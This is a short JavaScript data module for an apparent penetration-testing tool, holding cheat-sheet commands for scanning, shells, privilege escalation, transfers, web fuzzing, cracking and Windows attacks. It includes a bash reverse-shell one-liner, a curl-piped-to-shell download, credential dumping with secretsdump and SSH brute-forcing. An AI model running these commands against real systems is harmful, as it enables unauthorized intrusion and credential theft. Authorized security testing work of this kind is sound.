"use strict";
// Command cheat-sheets keyed by topic (nmap, shells, privesc, ...). Pure data;
// sentinel.js (cheats command, interactive menu, and --help) reads the topic
// keys and lines. Extracted from sentinel.js. For authorized testing only.
const CHEATS = {
  "nmap": ["nmap -sV -sC -oN scan.txt TARGET", "nmap -p- --min-rate 5000 -T4 TARGET", "nmap --script vuln TARGET"],
  "shells": ["bash -i >& /dev/tcp/IP/PORT 0>&1", "nc -lvnp 4444   # listener", "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'   # upgrade TTY"],
  "privesc": ["find / -perm -4000 -type f 2>/dev/null   # SUID", "sudo -l", "cat /etc/crontab", "curl -L .../linpeas.sh | sh"],
  "transfer": ["python3 -m http.server 8000", "curl http://IP:8000/f -o f", "wget http://IP:8000/f"],
  "web": ["gobuster dir -u http://TARGET -w common.txt", "ffuf -u http://TARGET/FUZZ -w list.txt", "sqlmap -u 'http://TARGET/?id=1' --batch --dbs"],
  "cracking": ["hashcat -m 0 hash.txt rockyou.txt", "john --wordlist=rockyou.txt hash.txt", "hydra -L users -P rockyou.txt ssh://TARGET"],
  "windows": ["evil-winrm -i TARGET -u USER -p PASS", "impacket-secretsdump DOM/USER:PASS@TARGET", "crackmapexec smb TARGET"],
};
function cheatTopics() { return Object.keys(CHEATS); }
module.exports = { CHEATS, cheatTopics };
